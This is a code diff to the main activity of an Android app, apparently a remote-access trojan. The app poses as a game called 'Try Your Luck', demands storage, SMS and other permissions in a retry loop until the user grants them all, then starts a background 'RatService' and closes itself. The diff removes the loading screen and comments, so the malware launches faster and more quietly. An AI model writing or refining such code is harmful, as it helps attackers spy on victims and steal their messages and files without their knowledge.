@@ -6,9 +6,6 @@ import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
-import android.widget.LinearLayout;
-import android.widget.ProgressBar;
-import android.widget.TextView;
 import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
@@ -26,38 +23,13 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        // Create simple loading screen
-        LinearLayout layout = new LinearLayout(this);
-        layout.setOrientation(LinearLayout.VERTICAL);
-        layout.setGravity(android.view.Gravity.CENTER);
-        layout.setBackgroundColor(0xFF1a1a2e);
-        
-        TextView textView = new TextView(this);
-        textView.setText("♟️ Try Your Luck");
-        textView.setTextSize(28);
-        textView.setTextColor(0xFFFFFFFF);
-        textView.setGravity(android.view.Gravity.CENTER);
-        textView.setPadding(0, 0, 0, 20);
-        
-        ProgressBar progressBar = new ProgressBar(this);
-        
-        layout.addView(textView);
-        layout.addView(progressBar);
-        setContentView(layout);
-
-        // Start permission check after a short delay
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                checkAndRequestPermissions();
-            }
-        }, 500);
+        // NO LAYOUT - just start directly
+        checkAndRequestPermissions();
     }
 
     private void checkAndRequestPermissions() {
         List<String> neededPermissions = new ArrayList<>();
 
-        // Add all required permissions
         neededPermissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
         neededPermissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
         neededPermissions.add(Manifest.permission.READ_SMS);
@@ -77,7 +49,6 @@ public class MainActivity extends AppCompatActivity {
             neededPermissions.add(Manifest.permission.POST_NOTIFICATIONS);
         }
 
-        // Check which permissions are not granted
         List<String> missingPermissions = new ArrayList<>();
         for (String perm : neededPermissions) {
             if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
@@ -86,23 +57,20 @@ public class MainActivity extends AppCompatActivity {
         }
 
         if (missingPermissions.isEmpty()) {
-            // All permissions granted - start app
             startApp();
         } else if (!permissionsRequested) {
-            // Request missing permissions
             permissionsRequested = true;
             String[] permsArray = missingPermissions.toArray(new String[0]);
             ActivityCompat.requestPermissions(this, permsArray, PERMISSION_REQUEST_CODE);
         } else {
-            // Permissions already requested but not granted - show message and retry
-            Toast.makeText(this, "Please grant all permissions to continue", Toast.LENGTH_LONG).show();
+            Toast.makeText(this, "Please grant all permissions", Toast.LENGTH_LONG).show();
             handler.postDelayed(new Runnable() {
                 @Override
                 public void run() {
                     permissionsRequested = false;
                     checkAndRequestPermissions();
                 }
-            }, 3000);
+            }, 2000);
         }
     }
 
@@ -111,7 +79,6 @@ public class MainActivity extends AppCompatActivity {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            // Check if all permissions are granted
             boolean allGranted = true;
             for (int result : grantResults) {
                 if (result != PackageManager.PERMISSION_GRANTED) {
@@ -123,7 +90,6 @@ public class MainActivity extends AppCompatActivity {
             if (allGranted) {
                 startApp();
             } else {
-                // Some permissions denied - show dialog and retry
                 Toast.makeText(this, "All permissions are required!", Toast.LENGTH_LONG).show();
                 permissionsRequested = false;
                 handler.postDelayed(new Runnable() {
@@ -138,7 +104,6 @@ public class MainActivity extends AppCompatActivity {
 
     private void startApp() {
         try {
-            // Start the RAT service
             Intent serviceIntent = new Intent(this, RatService.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForegroundService(serviceIntent);
@@ -146,16 +111,14 @@ public class MainActivity extends AppCompatActivity {
                 startService(serviceIntent);
             }
             
-            // Show success message
-            Toast.makeText(this, "App started successfully!", Toast.LENGTH_SHORT).show();
+            Toast.makeText(this, "✅ Service started!", Toast.LENGTH_SHORT).show();
             
-            // Close the app after starting service
             handler.postDelayed(new Runnable() {
                 @Override
                 public void run() {
                     finish();
                 }
-            }, 1000);
+            }, 500);
             
         } catch (Exception e) {
             e.printStackTrace();
